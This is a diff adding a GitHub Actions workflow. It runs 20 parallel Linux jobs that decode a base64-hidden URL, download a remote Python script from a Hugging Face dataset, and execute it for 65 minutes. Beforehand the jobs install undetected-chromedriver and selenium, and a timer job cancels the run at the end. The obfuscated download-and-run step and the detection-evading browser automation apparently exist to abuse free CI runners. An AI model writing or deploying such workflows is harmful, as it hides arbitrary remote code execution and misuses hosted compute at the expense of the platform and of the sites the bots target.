@@ -1,0 +1,107 @@
+name: Linux Fortified Task Garrison
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: fortified-garrison-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # قيّم الإبطال المطلق: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  abolitionist-prefect:
+    name: "Abolitionist Prefect"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Declare Absolute Abolition Verdict
+        run: |
+          echo "[PREFECT] Abolitionist prefect in session. Absolute abolition enforced at the 65-minute knell."
+          echo "[PREFECT] Reviewing workflow docket: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[PREFECT] Knell tolled! Declaring absolute abolition verdict..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[PREFECT] Absolute abolition verdict declared. Every surging and resting unit will be abolished."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الحامية
+  # =================================================================
+  fortify-garrison:
+    name: "GarrisonUnit-${{ matrix.unit_token }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_token: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
+      # ⌾ الفرع (Ⅰ): تجهيز الأرضية التمهيدية
+      # ▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
+      - name: Equip Preparatory Ground
+        run: |
+          echo "[EQUIP] Equipping preparatory ground for GarrisonUnit-${{ matrix.unit_token }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
+      # ⌾ الفرع (Ⅱ): التماس الوثيقة التنفيذية
+      # ▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
+      - name: Petition Executive Document
+        run: |
+          echo "[PETITION] Petitioning app_task.py from assigned depository annex..."
+          DEPOSITORY_ANNEX=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$DEPOSITORY_ANNEX" -o app_task.py
+          echo "[PETITION] Executive document petitioned successfully."
+
+      # ▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
+      # ⌾ الفرع (Ⅲ): استحضار المكتبات المؤازرة
+      # ▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
+      - name: Summon Auxiliary Libraries
+        run: |
+          echo "[SUMMON] Summoning auxiliary libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
+      # ⌾ الفرع (Ⅳ): التنفيذ المُطوَّق بالمدة (65 دقيقة)
+      # ▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
+      - name: Undertake Palisaded Operation
+        run: |
+          echo ">> Fortifying GarrisonUnit-${{ matrix.unit_token }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          GARRISON_PID=$!
+          
+          echo ">> Palisaded operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $GARRISON_PID 2>/dev/null; then
+            echo ">> Palisaded window elapsed! Retiring operation..."
+            kill -9 $GARRISON_PID
+            echo ">> Operation retired by palisade keeper."
+          else
+            echo ">> Operation closed within palisaded window."
+          fi
